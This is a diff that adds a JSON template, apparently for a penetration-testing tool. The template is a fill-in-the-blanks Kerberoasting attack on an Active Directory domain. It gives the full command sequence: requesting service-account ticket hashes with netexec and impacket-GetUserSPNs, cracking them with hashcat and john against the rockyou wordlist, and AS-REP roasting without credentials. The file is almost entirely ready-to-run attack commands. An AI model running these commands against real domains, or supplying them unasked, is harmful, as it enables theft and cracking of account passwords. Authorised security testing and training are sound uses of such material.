@@ -1,0 +1,12 @@
+{
+  "name": "Kerberoasting",
+  "description": "Kerberoasting service accounts",
+  "category": "ad",
+  "variables": [
+    "domain",
+    "dc_ip",
+    "username",
+    "password"
+  ],
+  "content": "Perform a Kerberoasting attack on {domain}.\n\n**1. Identify accounts with SPNs :**\n```bash\nnetexec ldap {dc_ip} -u {username} -p '{password}' --kerberoasting output.txt\n```\n\n**2. Impacket GetUserSPNs :**\n```bash\nimpacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {dc_ip} -request -outputfile hashes.txt\n```\n\n**3. Crack the hashes :**\n```bash\nhashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n```\n\n**Without credentials (AS-REP Roasting) :**\n```bash\nimpacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -usersfile users.txt -format hashcat\n```\n\nService accounts often have weak or reused passwords."
+}
